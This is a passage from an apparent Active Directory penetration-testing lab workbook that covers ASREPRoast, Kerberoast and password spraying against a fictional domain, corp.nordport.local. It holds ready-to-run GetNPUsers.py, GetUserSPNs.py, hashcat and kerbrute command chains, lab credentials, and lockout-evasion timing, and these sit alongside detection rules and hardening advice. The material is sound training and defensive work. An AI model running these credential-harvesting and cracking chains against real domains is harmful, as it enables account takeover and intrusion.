Verify the file contains your token: cat users.txt. If it shows svc_legacy_ with no suffix, the variable was empty; re-source your shell or check Step 1 of any prior chapter for the echo $OCR_SCOPE_TOKEN confirmation.

docs.title: Step 3: Request the AS-REP
docs.text:
GetNPUsers.py is part of the impacket suite. With -no-pass it sends an AS-REQ without the pA-ENC-TIMESTAMP field; the KDC checks each requested user's UAC. Users with pre-auth required produce KDC_ERR_PREAUTH_REQUIRED (impacket prints [-]). Users with pre-auth disabled produce a usable AS-REP that impacket formats as a hashcat-ready string.

Kali - GetNPUsers without authentication

GetNPUsers.py corp.nordport.local/ -no-pass -usersfile users.txt \
  -dc-ip <dc_ip> -outputfile asrep.hash
cat asrep.hash
Flag Effect <realm>/ Domain realm with trailing slash and no user; "list mode". -no-pass Skip the pre-auth attempt; just send the AS-REQ. -usersfile users.txt One username per line, queried in turn. -dc-ip <ip> Skip DNS for the KDC; talk to the IP directly. -outputfile asrep.hash Write hashcat-formatted hashes to file.

The file should contain one line in $krb5asrep$23$svc_legacy_<token>@CORP.NORDPORT.LOCAL:...$... format. The 23 after $krb5asrep$ is the encryption type (RC4-HMAC); if it shows 17 or 18 you got AES and need hashcat mode 18201 or 18202 in Step 4.

docs.title: Step 4: Crack with hashcat
docs.text:
Mode 18200 understands the $krb5asrep$23$ format. Hashcat hashes each candidate password with RC4-HMAC, computes the expected response, and compares to the captured hash. The seeded password is in rockyou.txt; best64.rule covers the typical mutations (number suffix, case toggle, leetspeak).

Kali - Crack the AS-REP

hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule
Flag Effect -m 18200 Net-Kerberos AS-REP RC4. Switch to 18201/18202 for AES. <hash_file> First positional. <wordlist> Second positional. -r <rule> Apply mutations from the rule file.

On modest hardware the seeded password cracks within minutes. When done:

hashcat -m 18200 asrep.hash --show

The trailing field after the colon is the plaintext.

docs.title: Step 5: Submit the Plaintext
docs.text:
The plaintext IS the flag for this exercise. Wrap the recovered plaintext in OCR{...} and submit, so a recovered plaintext of <plaintext> becomes OCR{<plaintext>}.

Common gotchas

  • etype mismatch: if the captured hash starts with $krb5asrep$17$ or $krb5asrep$18$, mode 18200 returns "no hashes loaded". Re-run with -m 18201 (AES128) or -m 18202 (AES256).
  • Realm casing: impacket is strict about realm form. CORP.NORDPORT.LOCAL/ (uppercase) is canonical; lowercase typically works but inconsistent casing breaks some impacket versions.
  • DC clock skew: Kerberos rejects timestamps more than 5 minutes off. chronyc tracking should show the Kali clock within 60 seconds of the DC. If skew is large, sudo ntpdate <dc_ip> first.
  • No candidates returned: the LDAP filter requires authentication to read UAC on most domains. If anonymous bind is disabled, you must have at least one valid credential to enumerate. j.chen suffices.

docs.title: Blue Team Perspective
docs.text:
ASREPRoast is detectable on the DC the moment it happens. The detection is one event ID, two filters, and a SIEM rule.

Activity Event ID Field giveaway AS-REP issued without preauth 4768 Pre-Authentication Type = 0 Account flagged with DONT_REQ_PREAUTH 4738 userAccountControl includes 0x400000 Bulk AS-REQ enumeration 4768 burst from one IP Source IP rate spike ASREP detection (MDI) "Suspicious Kerberos AS-REP" Defender for Identity

What detection looks like

A normal environment generates approximately zero 4768 events with Pre-Authentication Type = 0 in any 24-hour window. Any non-zero count from a single source IP is high-confidence enumeration. SIEM rule: alert when Event ID = 4768 AND Pre-Authentication Type = 0. The cardinality is low enough to investigate every hit.

docs.title: Hardening Note
docs.text:
The vulnerability lives entirely in one bit on one attribute on a small number of accounts. Audit and fix.

ASREPRoast hardening

  • Run an LDAP audit query weekly: (userAccountControl:1.2.840.113556.1.4.803:=4194304). Any result is a finding.
  • Clear the DONT_REQ_PREAUTH bit on every account: Set-ADAccountControl -Identity <user> -DoesNotRequirePreAuth $false.
  • Disable RC4 forest-wide via GPO Network security: Configure encryption types allowed for Kerberos = AES128, AES256. Forces AES, drastically slows offline cracking.
  • Move service accounts to gMSAs so the password is auto-rotated and far too long to crack.
  • Build SIEM detection: 4768 with Pre-Authentication Type = 0 from any source IP. Alert on any hit.

docs.title: Record Your Findings
docs.text:
Vulnerable account:

svc_legacy_<token>

AS-REP hash type:

$krb5asrep$23 (RC4-HMAC), hashcat mode 18200

Cracked plaintext (= flag):

(your password)

docs.title: Analysis Questions
docs.text:
1. Why is the AS-REP enc-part encrypted with the user's key rather than the krbtgt key, given that the AS-REP is supposed to issue a TGT?

Reveal Answer

The AS-REP carries two encrypted blobs. The TGT body (inside ticket.enc-part) is encrypted with krbtgt's key so only KDCs can read it. The enc-part (outside the ticket, at the message level) contains the session key, ticket lifetime, and other client-needed metadata; it is encrypted with the user's key so the legitimate user can decrypt it and learn the session key. The user must learn the session key to use the TGT for subsequent TGS-REQs. ASREPRoast attacks the message-level enc-part, not the TGT body. Cracking the enc-part yields the user's password but does not yield the TGT contents (which would be a much more powerful attack; and is the krbtgt-key forgery known as a golden ticket).

2. The encryption type in the AS-REP can be RC4-HMAC, AES128, or AES256. RC4 is 18200; AES variants are 18201, 18202. What controls which encryption type the KDC uses, and how can an attacker influence it?

Reveal Answer

The encryption type the KDC uses for the AS-REP is determined by the user's msDS-SupportedEncryptionTypes attribute (or, if not set, the domain default), intersected with the encryption types the client says it supports in the AS-REQ etype field. An attacker can request RC4-HMAC explicitly by setting the etype to arcfour-hmac only, which downgrades the response to RC4 if the user's account allows it. RC4 is the most desirable target for cracking because it is significantly faster to compute than AES, often by 2-10x. Modern AD environments disable RC4 globally via the Network security: Configure encryption types allowed for Kerberos GPO setting; when RC4 is disabled, the AS-REP comes back AES-encrypted (18201/18202) and cracking is slower but still possible. Always check the etype field of the captured hash before queuing a long-running crack job.

3. ASREPRoast does not produce any KDC error, only a successful AS-REP. From a defender's perspective, how do you detect an attack?

Reveal Answer

The defender's primary signal is anomalous volume of AS-REQs without pre-auth from a single source IP, especially against accounts that should never authenticate without pre-auth. Event ID 4768 (Kerberos TGT request) is the data source; filter for Pre-Authentication Type = 0 and group by source IP. A normal environment has near-zero such events; a single source generating dozens per minute is an active enumeration attempt. The secondary signal is creation or modification of the DONT_REQ_PREAUTH flag on any account: event 4738 (user account changed) with userAccountControl containing 0x400000. Both signals are easy to put into a SIEM rule. The hardening control is to ensure no production account has the flag set; run a weekly LDAP query for (userAccountControl:1.2.840.113556.1.4.803:=4194304) and treat any result as a finding.

docs.title: Key Takeaways
docs.text:
• DONT_REQ_PREAUTH (0x400000) makes a user's AS-REP issuable without pre-auth.
  • The AS-REP enc-part is encrypted with the user's key and crackable offline.
  • Hashcat mode 18200 (RC4) or 18201/18202 (AES variants) cracks the captured hash.
  • The LDAP filter (userAccountControl:1.2.840.113556.1.4.803:=4194304) finds candidates in one query.
  • Defenders detect via 4768 events with Pre-Auth Type = 0 and per-source rate spikes.

docs.title: Cheat Sheet Recap
docs.text:
The four operations below are the entire attack chain. Memorize them; this is the highest-yield Kerberos attack on most internal pentests.

Goal Command Find ASREPRoast candidates ldapsearch -x -LLL -H ldap://<dc> -D "<DOMAIN>\<u>" -w '<pw>' -b "<DN>" "(userAccountControl:1.2.840.113556.1.4.803:=4194304)" sAMAccountName Request AS-REP unauthenticated GetNPUsers.py <domain>/ -no-pass -usersfile users.txt -dc-ip <dc> -outputfile asrep.hash Crack RC4 AS-REP hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule Crack AES AS-REP hashcat -m 18202 asrep.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

docs.title: Spaced Repetition
docs.text:
Card 1: AS-REP Hash Mode

Q: What hashcat mode cracks an $krb5asrep$23$ hash, and what does the 23 mean?

Answer

Mode 18200. The 23 is the Kerberos encryption type for RC4-HMAC. AES128 is type 17 (mode 18201), AES256 is type 18 (mode 18202). The numeric type maps to RFC 3961 algorithm identifiers; 23 for ARCFOUR-HMAC is historically labeled arcfour-hmac-md5.

Card 2: GetNPUsers Without Credentials

Q: Write the GetNPUsers.py command to request AS-REPs for users listed in users.txt against corp.local at DC 10.10.10.10, with no authentication, writing output to asrep.hash.

Answer 
GetNPUsers.py corp.local/ -no-pass -usersfile users.txt \
  -dc-ip 10.10.10.10 -outputfile asrep.hash

-no-pass skips the pre-auth attempt. The trailing / after the realm and before nothing else means "no specific user, list mode". To target one user: GetNPUsers.py corp.local/userone -no-pass -dc-ip 10.10.10.10.

Card 3: LDAP Filter for Pre-Auth Disabled

Q: Write the LDAP filter that returns all users with DONT_REQ_PREAUTH set.

Answer 
(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))

OID 1.2.840.113556.1.4.803 is LDAP_MATCHING_RULE_BIT_AND. The decimal 4194304 is 0x400000, the DONT_REQ_PREAUTH bit. Use 1.2.840.113556.1.4.804 for OR matching.

Card 4: Defender Detection Signal

Q: What event ID and field combination indicates an in-progress ASREPRoast?

Answer

Windows event 4768 (Kerberos TGT request) with Pre-Authentication Type = 0. A normal environment has near-zero such events; a sudden cluster from one source IP is the signal. Add a SIEM rule: more than 5 such events in 60 seconds from a single source IP. The hardening control is ensuring no production user has DONT_REQ_PREAUTH set; weekly LDAP audit will catch creeping misconfigurations.

Card 5: AS-REP Encryption Etype Control

Q: Why might an attacker explicitly request RC4-HMAC (etype 23) from the KDC, and how is that done?

Answer

RC4-HMAC cracks 2-10x faster than AES variants on the same hardware. An attacker requests it by setting the etype field of the AS-REQ to arcfour-hmac only. The KDC honors the request if the user's msDS-SupportedEncryptionTypes permits RC4. Modern environments disable RC4 globally via Network security: Configure encryption types allowed for Kerberos, which forces AES and slows cracking. Check the captured hash format: $krb5asrep$23$ is RC4, $krb5asrep$17$ is AES128, $krb5asrep$18$ is AES256.

docs.title: Before You Begin
docs.text:
Kerberoast is the most reliable AD attack on the offensive checklist. Any authenticated domain user can request a service ticket (TGS-REP) for any account that has a Service Principal Name registered. The TGS-REP is encrypted with the service account's password-derived key. Weak password = crackable hash. The traffic looks identical to legitimate authentication; the SOC has no signal until the cracked password is used elsewhere.

Exercise 3.3 asks you to find one Kerberoast-able service account in Nordport's directory and crack its TGS-REP. The recovered password is your flag.

Tools required: impacket-GetUserSPNs (often GetUserSPNs.py), hashcat, ldapsearch. Pre-installed on Kali.

docs.title: Scenario
docs.text:
Marcus Bell: "If a service account has an SPN, any authenticated domain user can ask the KDC for a service ticket. The ticket is encrypted with the service account's password hash. Quiet attack, totally normal-looking traffic."

Per-student: svc_kerb_<token> has an SPN of the form MSSQLSvc/eng-build-NN.corp.nordport.local:1433. Crack its TGS-REP. The plaintext is the flag.

Credentials:

Username Password j.chen Welcome2026#

Domain: corp.nordport.local

docs.title: Your Objectives
docs.text:
• Enumerate accounts with registered SPNs
  • Request a TGS-REP for svc_kerb_<token>
  • Crack the TGS-REP with hashcat mode 13100
  • Submit the plaintext

docs.title: Kerberoast on the Wire
docs.text:
The diagram below traces the request from any authenticated user to a crackable hash. No special privilege is required; that is the entire reason the attack is so reliable.

sequenceDiagram
    autonumber
    participant C as Attacker (j.chen, any user)
    participant K as KDC (corp-dc01)

    Note over C,K: Step 1 -- attacker already has a TGT from earlier kinit
    C->>K: TGS-REQ<br/>sname=MSSQLSvc/eng-build-01:1433
    K-->>C: TGS-REP<br/>service ticket enc with svc_kerb_password_key
    Note right of C: $krb5tgs$23$*svc_kerb_<token>$REALM$SPN*$challenge$cipher
    Note over C: hashcat -m 13100 ... rockyou + best64
    Note over C: plaintext password recovered

docs.title: TGS-REP Hash Mode Lookup
docs.text:
The mode you launch depends on the etype the KDC returned. The table below tells you which hashcat mode matches each prefix.

TGS-REP prefix Etype Algorithm Hashcat mode $krb5tgs$23$ 23 RC4-HMAC 13100 $krb5tgs$17$ 17 AES128 19600 $krb5tgs$18$ 18 AES256 19700

docs.title: Background: SPNs and Why Service Tickets Are Crackable
docs.text: A Service Principal Name (SPN) is a string that identifies a service instance in the Kerberos namespace. The format is <service-class>/<host>[:port], for example MSSQLSvc/db01.corp.local:1433 or HTTP/web01.corp.local. When a client wants a ticket to talk to that service, it sends a TGS-REQ with that SPN as the sname; the KDC looks up which account is associated with the SPN, encrypts the service ticket with that account's password-derived key, and returns the ticket in the TGS-REP.

docs.title: Why this is attackable
docs.text:
The KDC does not check whether the requesting user has any actual relationship to the service. Any authenticated domain user can request a TGS for any SPN. The KDC issues the TGS-REP. The ticket is encrypted with the service account's NT hash (or AES key). An attacker captures the TGS-REP, brute-forces the encryption offline, and recovers the service account password.

The defender's only mitigation is strong service account passwords. Specifically:

  • Group Managed Service Accounts (gMSAs): Windows generates a 240-byte randomly-rotated password every 30 days. Cracking is computationally infeasible.
  • Standalone Managed Service Accounts (sMSAs): precursor to gMSAs, similar properties.
  • Long human-set passwords: 25+ characters with diverse character classes makes the hash impractical to crack in a useful timeframe.

In practice, most environments have at least one weak service account password. SQL Server installations from circa 2010 used Password!23 patterns. SCCM agents used short fixed credentials. CI/CD service accounts often share a password reused for a decade.

docs.title: The TGS-REP hash format
docs.text:
$krb5tgs$23$*svc_kerb_a7f3$CORP.NORDPORT.LOCAL$MSSQLSvc/eng-build-01.corp.nordport.local:1433*$<challenge>$<encrypted_blob>

23 is RC4-HMAC. Hashcat mode is 13100. AES128 is etype 17 (mode 19600), AES256 is etype 18 (mode 19700); the prefix changes accordingly.

docs.title: The LDAP filter
docs.text:
(&(samAccountType=805306368)(servicePrincipalName=*))

samAccountType=805306368 is "user object." servicePrincipalName=* means "has at least one SPN." Computer objects have SPNs too (machine accounts) but their passwords are 240 random bytes and are not crackable; filtering on samAccountType=805306368 keeps the result list focused on user-level service accounts.

docs.title: LDAP enumeration
docs.text:
ldapsearch -x -LLL -H ldap://<dc> \
  -D "CORP\j.chen" -w 'Welcome2026#' \
  -b "DC=corp,DC=nordport,DC=local" \
  "(&(samAccountType=805306368)(servicePrincipalName=*))" \
  sAMAccountName servicePrincipalName

docs.title: GetUserSPNs.py
docs.text:
Enumerate and request all in one shot:

GetUserSPNs.py corp.nordport.local/j.chen:'Welcome2026#' -dc-ip <dc> -request \
  -outputfile tgs.hash

Or target a specific user:

GetUserSPNs.py corp.nordport.local/j.chen:'Welcome2026#' -dc-ip <dc> \
  -request-user "svc_kerb_<token>" -outputfile tgs.hash

docs.title: hashcat mode 13100
docs.text:
hashcat -m 13100 tgs.hash /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule

For AES TGS-REPs, swap to -m 19600 or -m 19700. Modern DCs default to AES; RC4 cracking only works if the service account explicitly permits RC4 (msDS-SupportedEncryptionTypes allows it) or the domain default still allows it.

docs.title: Forcing RC4 (faster cracking)
docs.text:
You can request the TGS with etype restricted to RC4:

GetUserSPNs.py corp.nordport.local/j.chen:'Welcome2026#' -dc-ip <dc> \
  -request -outputfile tgs.hash
# GetUserSPNs.py defaults to RC4 when the account allows it; if you get AES anyway,
# set etype on the request manually with impacket scripts that expose the option.

If the domain or account denies RC4, you get AES back and crack with the AES mode.

docs.title: Step 1: List All SPN-Bearing User Accounts
docs.text:
The first move is to find every Kerberoast candidate the directory holds. The LDAP filter excludes computer accounts (whose passwords are 240 random bytes and uncrackable) and returns only the user-class accounts that have at least one SPN registered.

Kali - Enumerate via LDAP

ldapsearch -x -LLL -H ldap://<dc_ip> \
  -D "CORP\j.chen" -w 'Welcome2026#' \
  -b "DC=corp,DC=nordport,DC=local" \
  "(&(samAccountType=805306368)(servicePrincipalName=*))" \
  sAMAccountName servicePrincipalName \
  | grep -E '^(sAMAccountName|servicePrincipalName)'
Token Effect samAccountType=805306368 Filter to user-class objects only (computer accounts are 805306369). servicePrincipalName=* Has at least one SPN registered. sAMAccountName servicePrincipalName Trailing attribute list; only return these two. \| grep -E '^(sAMAccountName\|servicePrincipalName)' Filter LDIF to the two lines per record we care about.

The output is a series of pairs: each user with their registered SPN(s). Find svc_kerb_<token>. The other students' service accounts also appear; ignore them.

docs.title: Step 2: Request the TGS
docs.text:
GetUserSPNs.py authenticates as j.chen, requests a TGS for the named SPN, captures the TGS-REP, and formats it for hashcat in one step. The -request-user form is targeted; without it, the script requests TGSes for every SPN-bearing account it can see (loud on the wire, useful in real engagements where you do not yet know the target).

Kali - Targeted TGS request

mkdir -p ~/work/adpt-3-03 && cd ~/work/adpt-3-03
GetUserSPNs.py "corp.nordport.local/j.chen:Welcome2026#" \
  -dc-ip <dc_ip> \
  -request-user "svc_kerb_${OCR_SCOPE_TOKEN}" \
  -outputfile tgs.hash
cat tgs.hash
Flag Effect <realm>/<user>:<pw> Authentication string in impacket format. -dc-ip <ip> Skip DNS for the KDC; use this IP directly. -request-user <name> Request a TGS only for this account; otherwise all SPN-bearing accounts. -outputfile tgs.hash Write hashcat-formatted hash to file.

The file contains one line starting with $krb5tgs$. The number after the second $ is the etype: 23 = RC4-HMAC, 17 = AES128, 18 = AES256.

docs.title: Step 3: Crack with hashcat
docs.text:
Hashcat mode 13100 is the RC4-HMAC TGS-REP mode. RC4 is the easiest target because each candidate password requires only one MD4 + HMAC-MD5 round (versus thousands of PBKDF2 iterations for AES). Modern domains often disable RC4; if your hash came back AES, switch to mode 19600 (AES128) or 19700 (AES256).

Kali - Crack TGS-REP

hashcat -m 13100 tgs.hash /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule
Flag Effect -m 13100 Kerberos 5 TGS-REP etype 23 (RC4). <hash_file> Hashcat reads one hash per line. <wordlist> rockyou.txt is the canonical first try. -r <rule> best64.rule applies 64 common mutations to each candidate.

When done:

hashcat -m 13100 tgs.hash --show

The colon-separated last field is the plaintext.

docs.title: Step 4: Submit
docs.text:
The plaintext IS the flag for this exercise. Wrap the recovered plaintext in OCR{...} and submit, so a recovered plaintext of <plaintext> becomes OCR{<plaintext>}.

Common gotchas

  • AES-only environment: -m 13100 returns "no hashes loaded" if the hash starts with $krb5tgs$17$ or $krb5tgs$18$. Re-run with -m 19600 or -m 19700.
  • Clock skew: TGS-REQ requires a valid TGT, which fails if Kali's clock is more than 5 minutes off the DC. sudo chronyc -a 'burst 4/4' or sudo ntpdate <dc_ip> to sync.
  • No SPN configured: the seeded account has its SPN written by the setup script. If the ldapsearch returns no svc_kerb_<token>, the per-token seed never ran; check the Active Lab View status.
  • Quoting $ in zsh: ${OCR_SCOPE_TOKEN} works in bash and zsh, but $OCR_SCOPE_TOKEN (no braces) followed by _ glues the underscore into the name in some shells. Always brace.

docs.title: Blue Team Perspective
docs.text:
The TGS-REQ itself is normal traffic. Detection lives in volume and etype anomalies on event 4769.

Activity Event ID Field giveaway Service ticket issued 4769 Service Name per request RC4 forced for cracking 4769 Ticket Encryption Type = 0x17 Bulk SPN enumeration 4769 burst many distinct Service Name per source IP Defender for Identity "Suspected Kerberoasting attack" MDI alert

What the SOC sees in practice

A normal user generates one or two distinct 4769 service names per day. An attacker batch-requesting every SPN in the directory generates dozens in seconds. SIEM rule: alert on more than 10 distinct service names per source identity per minute, or any 4769 with Ticket Encryption Type = 0x17 against an account whose msDS-SupportedEncryptionTypes should disallow RC4. Both rules are cheap and high-signal.

docs.title: Hardening Note
docs.text:
The vulnerability is the password, not the protocol. Strong service-account secrets make the attack pointless even when the attack succeeds.

Kerberoast hardening

  • Migrate every service account to a gMSA. Auto-rotated 240-byte passwords are computationally uncrackable.
  • For accounts that must remain user-mode, set passwords to 25+ random characters and document rotation cadence.
  • Disable RC4 forest-wide via GPO Network security: Configure encryption types allowed for Kerberos = AES128, AES256.
  • Set msDS-SupportedEncryptionTypes on every service account to disallow RC4.
  • SIEM detection on event 4769 with RC4 etype and on per-source request-volume spikes.
  • Inventory SPNs quarterly; remove SPNs from accounts that no longer host services.

docs.title: Analysis Questions
docs.text:
1. The KDC issues a TGS for any SPN to any authenticated domain user. From a defender's perspective, is detection of Kerberoast possible at the network layer?

Reveal Answer

Detection at the network layer is hard because the TGS request itself is normal traffic. The signal lives in the volume and breadth of TGS requests from a single principal. A normal user requests TGSes for the few services they actually use over the day; an attacker requesting TGSes for every SPN in the directory generates a noticeable spike. Windows logs event 4769 (Kerberos service ticket request) on the DC; SIEMs can rule on "more than N distinct service names requested by the same source in a short window." Microsoft Defender for Identity and other ITDR products have built-in Kerberoast detections that combine 4769 volume with anomalous timing. The hardening control is to ensure the TGSes that are issued are AES (not RC4) and that the underlying account passwords are gMSA-rotated, so the cracked-hash phase becomes infeasible regardless of how many TGSes the attacker collects.

2. Why are gMSAs effectively immune to Kerberoast cracking?

Reveal Answer

A gMSA's password is generated by the KDC as a 240-byte random value, automatically rotated every 30 days, and stored only on machines and accounts authorized to read it via the msDS-GroupMSAMembership attribute. Because the password is 240 bytes (1920 bits) of pure randomness, the search space is computationally infeasible: even at one billion guesses per second, you would need on the order of 10^570 years to brute-force one password, and the password rotates every month. Kerberoast TGS-REPs against gMSA accounts can still be requested, but the resulting hash is uncrackable in any meaningful timeframe. The mitigation is not to block the request; it is to make the resulting hash not worth cracking. Migrating service accounts to gMSAs is the single most effective Kerberoast mitigation.

3. The TGS-REP is encrypted with the service account's password-derived key. The TGT (issued in the AS-REP) is encrypted with the krbtgt key. If you crack a service account's password via Kerberoast, can you forge silver tickets, golden tickets, both, or neither?

Reveal Answer

Cracking a service account's password via Kerberoast yields the password (or its derived NT hash). With that hash you can forge silver tickets for that specific service, because silver tickets are TGS-REPs encrypted with the service account's key and you now possess that key. You cannot forge golden tickets because those require the krbtgt account's hash, which you do not have. The progression is: Kerberoast a service account -> forge silver tickets to that service indefinitely -> potentially escalate to a Domain Admin who logs into that service -> dump krbtgt from a DC -> forge golden tickets across the entire domain. Kerberoast is rarely the final step in a chain; it is usually a first or middle step toward higher privilege.

docs.title: Key Takeaways
docs.text:
• Any authenticated domain user can request a TGS-REP for any registered SPN.
  • The TGS-REP is encrypted with the service account's key; weak passwords crack offline.
  • Hashcat mode 13100 (RC4) or 19600/19700 (AES variants).
  • LDAP filter (&(samAccountType=805306368)(servicePrincipalName=*)) finds candidates.
  • gMSAs make cracking infeasible. Migrate service accounts.

docs.title: Cheat Sheet Recap
docs.text:
The four operations below are the entire Kerberoast loop. Run them on every engagement; the attack still works in 2026.

Goal Command Enumerate SPN-bearing user accounts ldapsearch -x -LLL -H ldap://<dc> -D "<DOMAIN>\<u>" -w '<pw>' -b "<DN>" "(&(samAccountType=805306368)(servicePrincipalName=*))" sAMAccountName servicePrincipalName Request all TGSes (one shot) GetUserSPNs.py "<domain>/<u>:<pw>" -dc-ip <dc> -request -outputfile tgs.hash Targeted TGS request GetUserSPNs.py "<domain>/<u>:<pw>" -dc-ip <dc> -request-user "<svc>" -outputfile tgs.hash Crack TGS-REP hashcat -m 13100 tgs.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

docs.title: Spaced Repetition
docs.text:
Card 1: TGS-REP Hashcat Mode

Q: What hashcat mode cracks $krb5tgs$23$?

Answer

Mode 13100 for RC4-HMAC. Mode 19600 for AES128 ($krb5tgs$17$). Mode 19700 for AES256 ($krb5tgs$18$). Modern domains default to AES; RC4 mode only works if the account or domain still permits RC4.

Card 2: GetUserSPNs Targeted Request

Q: Write the GetUserSPNs.py command to request a TGS for svc_app01 only against corp.local at 10.10.10.10 using j.smith / Pass#, writing to tgs.hash.

Answer 
GetUserSPNs.py "corp.local/j.smith:Pass#" \
  -dc-ip 10.10.10.10 \
  -request-user "svc_app01" \
  -outputfile tgs.hash

Drop -request-user to request TGSes for every SPN-bearing account in one batch.

Card 3: LDAP Filter for SPNs

Q: Write the LDAP filter that returns user-class accounts with at least one SPN.

Answer 
(&(samAccountType=805306368)(servicePrincipalName=*))

samAccountType=805306368 selects user objects (excluding computer accounts which have SPNs but uncrackable passwords). The * matches any SPN.

Card 4: gMSA as Mitigation

Q: Explain in two sentences why migrating service accounts to gMSAs makes Kerberoast practically irrelevant.

Answer

A gMSA password is 240 random bytes (1920 bits) automatically rotated every 30 days; the cracking search space is computationally infeasible regardless of TGS-REP volume. Attackers can still request the TGS-REP, but the resulting hash is uncrackable in any useful timeframe, so the attack chain stalls before the credential-recovery step.

Card 5: Silver vs Golden Ticket from Kerberoast

Q: A successful Kerberoast yields a service account's password. Which forged ticket types can you now produce?

Answer

Silver tickets only. Silver tickets are TGS-REPs encrypted with the service account's own key (which you now have). Golden tickets require the krbtgt hash, which you do not have. Silver tickets work indefinitely against the cracked service until the password rotates. They are useful for persistence and for accessing data the service holds.

docs.title: Before You Begin
docs.text:
Password spraying is the inversion of brute force. Brute force tries many passwords against one account; spray tries one password against many accounts. Spraying succeeds because human beings reuse the same handful of seasonal passwords across organizations. Pick Summer2026#, try it against every domain user, and you will find at least one. The technique is so reliable that it is the standard initial-access vector for state actors operating against unmonitored M365 tenants.

Exercise 3.4 gives you a list of Nordport users and asks you to find the one whose password matches a seasonal pattern. The cracked account holds your flag in a token-scoped share.

Tools required: kerbrute, netexec, ldapsearch, smbclient. Pre-installed on Kali.

docs.title: Scenario
docs.text:
Marcus Bell: "There is always one. Maybe two. Pick a password your average user might use this season, try it against every account, and slow it down enough not to lock anyone out. Lockout policy says 5 failures in 15 minutes, so we stay under three. kerbrute passwordspray uses Kerberos AS-REQs that never increment the bad password count; so unlike SMB-based spraying, you do not lock anyone out by accident."

The discoverable per-token account name follows the pattern summer.kowalski_<token>. The seasonal password is Summer2026#. Read the flag from your token-scoped directory under \\corp-dc01\SprayFlags\.

Credentials:

Username Password Use j.chen Welcome2026# LDAP enumeration to build the user list

Domain: corp.nordport.local

docs.title: Your Objectives
docs.text:
• Pull the full list of domain users via LDAP
  • Spray a curated seasonal password list with kerbrute passwordspray
  • Identify your per-token discovered account
  • Read your token-scoped FLAG.txt

docs.title: Brute vs Spray, Side by Side
docs.text:
The two attacks invert each other. The table below makes the trade-off explicit.

Dimension Brute force Password spray Direction many passwords -> 1 user 1 password -> many users Lockout risk very high (account locks in seconds) very low (one attempt per account) Detection signal per-account 4740 lockout volume spike on DC Yield only if password is in your list AND user has it hits whenever any user has the picked password When to choose when you must crack a specific account first-pass initial access against unknown users

docs.title: Spray Cadence That Stays Below Lockout
docs.text:
The flowchart below is the time line you want for any multi-password spray. It assumes the standard 5-attempt / 15-minute lockout window plus a small buffer for legitimate user typos.

flowchart LR
    P1["Pwd 1: Summer2026#"]
    W1["wait 20 min<br/>(lockout window + 5 buffer)"]
    P2["Pwd 2: Welcome2026#"]
    W2["wait 20 min"]
    P3["Pwd 3: Nordport2026#"]
    DOTS["..."]

    P1 --> W1 --> P2 --> W2 --> P3 --> DOTS

docs.title: Background: Why Spraying Beats Brute Force
docs.text: A typical AD lockout policy locks an account after 5 failed authentications within 15 minutes. Brute-forcing one user's password yields a lockout in seconds; you also alert the user (their account starts behaving strangely) and the SOC (event 4740 fires on lockout). Spraying flips the math: with 1000 users in the directory, spraying one password tries 1000 attempts but only one per account. No lockouts, no per-user anomalies, and the only signal is a volume spike at the DC.

docs.title: Why kerbrute is preferred for spraying
docs.text:
kerbrute passwordspray uses Kerberos AS-REQs to test passwords. The KDC returns either:

  • KDC_ERR_PREAUTH_FAILED (24); wrong password
  • KRB_AS_REP; right password (issued ticket)
  • KDC_ERR_CLIENT_REVOKED (18); account locked or disabled
  • KDC_ERR_C_PRINCIPAL_UNKNOWN (6); user does not exist

The key insight: a failed Kerberos pre-auth does not increment the standard badPwdCount LSA counter the way a failed SMB or LDAP bind does. Microsoft's lockout policy reads badPwdCount. A pre-auth failure increments a separate Kerberos-specific counter that, in default policies, does not feed lockout. So kerbrute passwordspray can hammer accounts without locking them.

The non-locking behavior depends on the lockout policy configuration. Enterprises that explicitly enable Kerberos-based lockout (some hardened policies) negate the advantage. The default does not.

docs.title: Seasonal password patterns
docs.text:
Patterns that have hit on every internal pentest one of us has run since 2018:

Pattern Example values <Season><Year><Symbol> Spring2026#, Summer2026!, Fall2026#, Winter2026! <Company><Year><Symbol> Nordport2026#, Nordport2026! <Month><Year><Symbol> January2026#, April2026# Sports team + year Cowboys2026#, Yankees2026# Default templates Welcome2026#, Password123!

A short curated list of 8 to 12 candidates is more useful than a giant wordlist. You only get one shot per account before lockout windows close, so quality of pick beats quantity.

docs.title: The lockout math
docs.text:
With a 5-attempt / 15-minute window:

  • Try 1 password every 12 minutes per account: safe.
  • Try 4 passwords back-to-back: only if you accept the risk that the next legitimate failed login locks the account.
  • Try 5 passwords back-to-back: lockout on the next legitimate attempt.

A safe operational rule is 3 attempts maximum per account per 15-minute window, leaving room for the legitimate user to mistype twice without locking themselves out. That bound is what the workbook's "stay under three" means.

docs.title: kerbrute passwordspray
docs.text:
kerbrute passwordspray --dc <dc_ip> -d corp.nordport.local users.txt 'Summer2026#'

Useful flags: - --dc target DC IP (otherwise kerbrute tries to resolve via DNS) - -d realm - -t thread count (default 10; lower is gentler) - --delay milliseconds between attempts - -v verbose - -o output file

docs.title: Building the user list
docs.text:
ldapsearch -x -LLL -H ldap://<dc> \
  -D "CORP\j.chen" -w 'Welcome2026#' \
  -b "DC=corp,DC=nordport,DC=local" \
  "(&(objectCategory=person)(objectClass=user))" sAMAccountName \
  | grep -oE 'sAMAccountName: \S+' \
  | awk '{print $2}' \
  > users.txt

The 250-user baseline plus 25 per-token accounts will yield ~275 lines.

docs.title: netexec spray (for comparison; do NOT use unless you accept lockout risk)
docs.text:
netexec smb <dc> -u users.txt -p 'Summer2026#' -d corp.nordport.local --continue-on-success

SMB-based spraying works but increments badPwdCount on every failure. Use kerbrute for production sprays unless you have explicit authorization to lock accounts.

docs.title: Step 1: Build the User List
docs.text:
Spraying needs a username list. ldapsearch with the simple "all user objects" filter pulls every domain account in one query. Pipe through grep -oE to isolate the sAMAccountName: ... lines from the LDIF and awk to extract just the value.

Kali - Pull every user's sAMAccountName

mkdir -p ~/work/adpt-3-04 && cd ~/work/adpt-3-04
